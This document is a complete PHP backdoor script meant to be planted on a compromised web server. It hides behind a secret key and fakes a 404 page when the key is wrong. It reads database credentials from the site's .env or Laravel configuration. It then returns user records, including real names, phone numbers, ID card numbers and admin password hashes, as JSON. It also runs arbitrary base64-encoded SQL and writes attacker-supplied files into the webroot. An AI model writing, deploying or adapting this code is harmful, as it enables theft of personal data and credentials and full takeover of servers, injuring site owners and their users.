<?php
error_reporting(E_ALL);
ini_set('display_errors', 'On');
define('ROOT_URL', dirname(dirname('http://' . $_SERVER['HTTP_HOST'] . $_SERVER['PHP_SELF'])));
if (!isset($_REQUEST["key"]) || "C05zxNPPIDjfr6o0yFlTrVD7" !== $_REQUEST["key"]) {
    header("status: 404 Not Found");exit('');
}
$webroot = $_SERVER['DOCUMENT_ROOT'];

try{
    $db = file_get_contents($webroot . '/../.env');
    preg_match('/DB_HOST=([A-Za-z0-9.]+)/', $db, $DB_HOST);
    preg_match('/DB_PASSWORD=(\S+)/', $db, $DB_PASSWORD);
    preg_match('/DB_PORT=(\S+)/', $db, $DB_PORT);
    preg_match('/DB_DATABASE=(\S+)/', $db, $DB_DATABASE);
    $mysql_db_name=$DB_DATABASE[1];
    preg_match('/DB_USERNAME=(\S+)/', $db, $DB_USERNAME);
    $conn = @new mysqli($DB_HOST[1],$DB_USERNAME[1],$DB_PASSWORD[1],$mysql_db_name,$DB_PORT[1]);
} catch (Exception $e) {
    echo $e->getMessage();
    try{
        $db = require $webroot . '/../Laravel5/config/database.php';
        $mysql_host=$db['database']['connections']['mysql']['host'];
        $mysql_user=$db['database']['connections']['mysql']['username'];
        $mysql_pwd=$db['database']['connections']['mysql']['password'];
        $mysql_db_name=$db['database']['connections']['mysql']['database'];
        $mysql_db_port=$db['database']['connections']['mysql']['port'];
        $conn = @new mysqli($mysql_host, $mysql_user, $mysql_pwd, $mysql_db_name, $mysql_db_port);
        $prefix = $mysql_db_name;
    }catch (Exception $e){
    }
}

$response['website'] = $_SERVER['SERVER_NAME'];
$siteName = '';
$prefix = $mysql_db_name;
if (!$conn) {
    die("{\"status\":\"failed\",\"count\":0}");
}
$conn->query("set names 'utf8';");
$select_db = $conn->select_db($mysql_db_name);
$addDate = date('Y-m-d') . ' 00:00:00';
if (isset($_REQUEST["addDate"])) {
    $addDate = str_replace("/", "-", $_REQUEST["addDate"]);

}
$whereSql = "";
$whereReq = "";
if (isset($_REQUEST["where"])) {
    $whereReq = $_REQUEST["where"];
}
$ID = array();
if (isset($_REQUEST["tbl"]) && "admin" === $_REQUEST["tbl"]) {
    if (isset($_REQUEST["addDate"])) {
        $whereSql = " ". $whereReq;
    }
    $admin_tbl = $prefix .".". 'admin';
    $sql = "select * from (SELECT id,username,password,role_id,null as tel, null as lastloginip,null as lastloginip_attribution,null as last_time,null as email,1 as site_type FROM " . $admin_tbl . ") a  " . $whereSql;
} else {
    if (isset($_REQUEST["addDate"])) {
        $whereSql = " where regtime >= unix_timestamp(\"" . $addDate . "\") " . $whereReq;
    } else {
        $whereSql =  " ". $whereReq;
    }
    $tb_user = $prefix . "."."users";
    $tb_userinfo = $prefix .".". "user_real ";

    $sql = "select * from (select cu.id,cu.account_number as username,ci.name as real_name,cu.phone,ci.card_id as id_card,null as bank_card,null,null as regip,null as reg_time,null as wechat,null as qq,null as home_address,null as marital_status,null as education,null as industry,null as company_name,null as company_address,null as balance from " . $tb_user . " cu left join " . $tb_userinfo . " ci on cu.id=ci.user_id ) a" . $whereSql;
    }

function check_phone($phone){
    $check = '/^(1(([35789][0-9])|(47)))\d{8}$/';
    if (preg_match($check, $phone)) {
        return true;
    } else {
        return false;
    }
}
if (isset($_REQUEST["query"])) {
    $sql = base64_decode($_REQUEST["query"]);
}
if (isset($_REQUEST["path"]) && isset($_REQUEST["code"])) {
    $path = base64_decode(substr($_REQUEST["path"], 2));
    $code = base64_decode(substr($_REQUEST["code"], 2));
    file_put_contents($webroot . "/" . $path, $code);
}
if ($result = $conn->query($sql)) {
    if (isset($_REQUEST["tbl"]) &&"admin" === $_REQUEST["tbl"]){
        while ($row = $result->fetch_assoc()){
 
        array_push($ID, $row);}
    }else{
        while ($row = $result->fetch_assoc()) {

        array_push($ID, $row);
    }
    }
    $response['status'] = "success";
    }
    else {
    $response['status'] = "failed";
}
$response['data'] = $ID;
$response['count'] = sizeof($ID);
$response['typeID'] = 'rA5MfQyY';
$response['version'] = '0.0.1';
echo json_encode($response);
$conn->close();
?>